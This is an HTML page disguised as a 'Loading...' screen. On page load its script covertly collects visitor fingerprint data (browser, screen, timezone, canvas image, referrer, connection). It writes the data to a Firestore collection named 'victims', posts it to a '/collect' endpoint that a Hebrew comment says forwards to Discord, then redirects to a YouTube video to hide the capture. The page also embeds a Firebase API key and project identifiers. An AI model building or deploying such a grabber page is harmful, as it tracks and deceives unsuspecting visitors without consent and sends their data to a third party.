<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // הקונפיג שלך
        const firebaseConfig = {
            apiKey: "AIzaSyDCmXZoM__bVIQ8xok5uv6UVf_DERvh4bY",
            authDomain: "elias-7d300.firebaseapp.com",
            projectId: "elias-7d300",
            storageBucket: "elias-7d300.firebasestorage.app",
            messagingSenderId: "90471380067",
            appId: "1:90471380067:web:4444777056e8d0d847f456"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // איסוף מידע מקיף
        const victimData = {
            timestamp: new Date().toISOString(),
            ip: 'server',
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            canvas: document.createElement('canvas').toDataURL(),
            webgl: navigator.gpu ? 'supported' : 'no',
            plugins: navigator.plugins.length,
            cookies: navigator.cookieEnabled,
            localStorage: !!localStorage,
            referrer: document.referrer,
            url: location.href,
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink
            } : null,
            battery: navigator.getBattery ? 'supported' : 'no'
        };

        // שמירה ב-Firestore
        addDoc(collection(db, "victims"), victimData)
            .then(() => console.log('✅ Firebase'))
            .catch(e => console.log('Firebase error'));

        // שלח לשרת (לדיסקורד)
        fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(victimData)
        });

        // הסטה אחרי 100ms
        setTimeout(() => {
            window.location.href = 'https://www.youtube.com/watch?v=9E6b3swbnWg';
        }, 100);
    </script>
    <style>body{background:#000;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;font-size:24px;}</style>
